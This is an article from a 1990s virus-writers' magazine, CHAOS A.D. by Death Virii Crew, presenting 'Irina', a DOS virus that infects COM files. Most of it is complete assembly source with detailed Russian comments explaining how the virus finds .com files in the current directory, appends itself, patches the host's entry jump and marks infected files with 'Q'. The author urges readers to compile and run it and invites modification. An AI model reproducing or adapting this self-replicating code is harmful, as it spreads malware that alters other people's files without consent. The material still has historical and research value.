comment {

[Death Virii Crew] Presents
CHAOS A.D. Vmag, Issue 3, Autumn 1996 - Winter 1997


				  Irina.


 Представляю всем читателям CHAOS A.D. свой первый вирь. Назван в честь моей
любимой девушки. Он не содержит никаких деструктивных функций и заражает СОМ-
файлы в текущем каталоге, дописывает себя в конец файла. Поскольку я человек
скромный, то как признак заражеенности использована первая буква моей клички
Q. Я считаю что вирь не сложный и может быть использован как учебное пособие
для начинающих. У кого возникнут вопросы и предложения по даному изделию можете
писать (ударение на второй слог) по адресу Death Virii Crew:263020,Луцк,а/я 11,
Quiet (Irina). Для компиляции я использовал TASM ver.3.2 и ver.3.1. Откомпили-
руйте, запустите и разрешите этому безобидному домашнему животному пожить в ва-
шем информационном пространстве. Можете модифицировать этот вирь как хотите,
но я не несу никакой ответственности за наннесенный ущерб причиненный какой-
нибудь деструктивной функцией вставленной в вирь.

							(C) By Quiet [DVC]
{
;----------------------- резать тут -------------------------------------------
.model tiny
.code
org 100h
start:

db 0e9h                 ; Машинный код команды JMP
dw 0004h                ; На 4 байта
bytes db 'DVCQ'         ; Когда это вирь в чистом виде здесь записана абревиату-
                        ; ра Death Virii Crew (DVC) и признак зараженности Q.
                        ; Когда это зараженная прога здесь записано оригинальные
                        ; первые три байта зараженной проги и признак заражен-
                        ; ности Q.

call _1                 ; При команде CALL процессор помещает адрес возврата
_1:                     ; (содержимое регистра IP) в стек выполняемой проги
pop bp                  ; вынимаем из стека то что заслали  CALL'ом в ВР
sub bp,10ah             ; ВР=ВР-PSP(100h)+0ah где 0аh длинна от начала виря до
                        ; даной команды и получаем длинну зараженной проги
cld                     ; сбрасываем флаг направления DF тем самым устанавливая
                        ; направление выполнения операций со строками слева на
                        ; направо

; в этой операции мы сравнивам первые три байта ячеек bytes и dvc для того чтобы
; определить: это чистый вирь или зараженная прога с вирием

mov si,offset bytes     ; в SI смещение ячейки bytes
add si,bp               ; додаем длинну зараженной проги
mov di,offset dvc       ; в DI смещение ячейки dvc
add di,bp               ; додаем длинну зараженной проги
mov cx,3		; в CX количество проверяемых байт
rep cmpsb		; операция проверки
je _2			; если байты совпадают, значит значит чистый вирь пере-
			; ход на _2, если не совпадают идем дальше

; здесь мы востанавливаем первые 3 байта зараженной проги

mov si,offset bytes 	; в SI смещение ячейки bytes
add si,bp		; додаем длинну зараженной проги
mov di,100h		; в DI адрес куда мы будем востанавливать
mov cx,3		; количество востанавливаемых байтов
rep movsb		; операция пересылки

; в этой операции мы сохраняем DTA

mov cx,100h		; количество пересылаемых байтов
push cx			; эту сотню мы в стэк, потом мы используем ее для пере-
			; дачи управления зараженной проги
mov si,80h		; в SI адрес с какого начинается DTA (по умолчанию 80h)
mov di,dta		; в DI адрес буфера в котрый мы сохраняем DTA
rep movsb		; операция пересылки

_2:

; здесь мы устанавливаем нужный на адрес DTA. Хотя по умолчанию он должен и так
; быть установлен по адресу 80h, но у меня с этим возникли проблеммы и я решил
; сам указать системе куда она должна возвращать имя потэнциальной жертвы.

mov ah,1ah		; устанавливаем DTA
mov dx,80h		; по адресу 80h
int 21h

mov ah,4eh		; функция поиска первой жертвы
find:
mov cx,20h		; с атрибутом ARCHIVE
mov dx,offset fname	; смещение ячейки памяти в котрой нахаодится маска по
			; которой мы будем искать жертву
add dx,bp		; прибавляем длинну зараженной проги
int 21h
jnc _3			; если нет ошибок то на _3
jmp quit		; ошибки? на выход

_3:
cmp word ptr ds:[9ah],61000 ; потенцильная жертва не должна быть больше 61000 
			    ; байтов. Длинна потенциальной жертвы возвражается
			    ; системой по смещению 9аh 
ja next			; если длинна больше 61000 то на поиск следующей жертвы

mov ax,3d02h		; открываем жертву на чтение/запись
mov dx,9eh	; в DX адрес ячейки памяти в которой находится имя жертвы (по 
		; умолчанию оно находится по адресу 9eh)

int 21h
jc next			; ошибки? на поиск следующей жертвы

mov bx,ax		; Описатель файла в BX.При открытии файла система на-
			; значает ему определенный описатель через который она 
			; будет работать с файлом в дальнейшем 
mov ah,3fh		; функция чтеня из файла в AH
mov cx,3		; количество считываемых байтов в CX
mov dx,offset bytes	; смещение ячейки памяти в которую будем считывать в DX
add dx,bp		; прибавляем длинну зараженной проги
int 21h
jc next			; ошибки? на поиск следующей жертвы

mov ax,4202h		; в AX функция перемещения pointer'a в конец жертвы
mov cx,0		; в CX 0
mov dx,0		; в DX 0
int 21h
jc next			; ошибки? на поиск следующей жертвы

; при перемещении pointer'a в конец файла в AX возвращается длинна файла

mov flen[bp],ax		; содержимое AX в flen[bp]
sub ax,3		; вычитаем 3 байта (длинна команды JMP которая будет 
			; стоять в начале). В AX будет длинна на которую нужно 
			; совершить JMP переход
mov jmpadr[bp],ax	; содержимое AX в jmpadr[bp]

mov dx,flen[bp]		; длинну жертвы в DX
mov cx,virlen		; длинну виря в CX
sub dx,cx		; вычитаем CX из DX 
js next			; если результат отрицаиельный то поиск следующей жертвы
add dx,6		; прибавим к DX 6 байтов

mov ax,4200h		; в AX функция перемещения pointer'a в начало файла
mov cx,0		; CX=0
int 21h
jc next			; ошибки? на next
jmp _4			; переход на _4

next:			; здесь мы ищем следующую жертву
mov ah,3eh		; закрываем файл
int 21h
mov ah,4fh		; поиск следующей жертвы
jmp find

_4:
mov ah,3fh		; читаем из файла
mov cx,1		; 1 байт
mov dx,offset bytes+3	; в ячейку bytes на место последнего символа
add dx,bp		; прибавляем длинну проги
int 21h
jc next			; ошибки? на next

; здесь мы проверям файл на зараженнность

cmp byte ptr bytes+3+bp,'Q'	; сравниваем то что прочитали с буквой Q
je next			; эту жертву мы уже имели? на поиск следующей жертвы

mov ax,4202h		; в AX функция премещения pointer'a в конец файла
mov dx,0		; в DX 0
mov cx,0		; в CX 0
int 21h
jc next			; ошибки? на next

; здеся мы имеем жертву

mov ah,40h		; в AH функция записи в файл
mov cx,virlen		; в CX количество записываемых байтов
mov dx,100h		; в DX откуда будем записывать 
add dx,bp		; прибавляем длинну проги
int 21h
jc next			; ошибки? на nеxt

mov ax,4200h		; в AX функция перемещения pointer'a в начало файла
mov cx,0		; в CX 0
mov dx,0		; в DX 0
int 21h
jc next			; ошибки? на next

mov ah,40h		; записываем в жертву
mov cx,1		; один байт
mov dx,offset jump	; с ячейки памяти JUMP
add dx,bp		; прибавляем длинну проги
int 21h
jc next			; ошибки? на next

mov ah,40h		; записываем в жертву
mov cx,2		; два байта
mov dx,offset jmpadr	; с ячейки памяти JMPADR
add dx,bp		; прибавляем длинну проги
int 21h
jc next			; ошибки? на next

mov ax,flen[bp]		; в AX из FLEN[BP]
add ax,6		; прибавляем 6
mov flen[bp],ax		; и засылаем все это в AX

mov ax,4200h		; pointer в начало
mov cx,0		; в CX 0
mov dx,flen[bp]		; в DX из FLEN[BP]
int 21h
jc next			; ошибки? на next

mov ah,40h		; записываем в жертву
mov cx,1		; 1 байт
mov dx,offset q		; и ячейки памяти Q
add dx,bp		; прибавляем длинну проги
int 21h
jnc quit		; если нет ошибок то на выход
jmp next		; ошибки? на next

quit:			; выход
mov ah,3eh		; закрываем жертву
int 21h

mov si,dta		; в SI адрес где находится старая DTA 
mov di,80h		; в DI адрес куда мы ее перешлем
mov cx,100h		; в CX сколько мы ее перешлем
rep movsb		; пресылаем
ret			; GAME OVER

jump db 0e9h		; JMP в машинном коде
jmpadr dw ?		; сюда заносится на сколько байтов делать JMP
q db 'Q'		; для сравнения на зараженность
dta equ 0f000h		; адрес буфера для сохранения DTA
flen dw ?		; сюда заносится длинна жертвы
dvc db 'DVC'		; для проверки на чистый вирь
fname db '*.com',0	; маска по которой ищем жертву
virlen equ $-start	; длинна виря 
end start
----------------------- резать тут -------------------------------------------
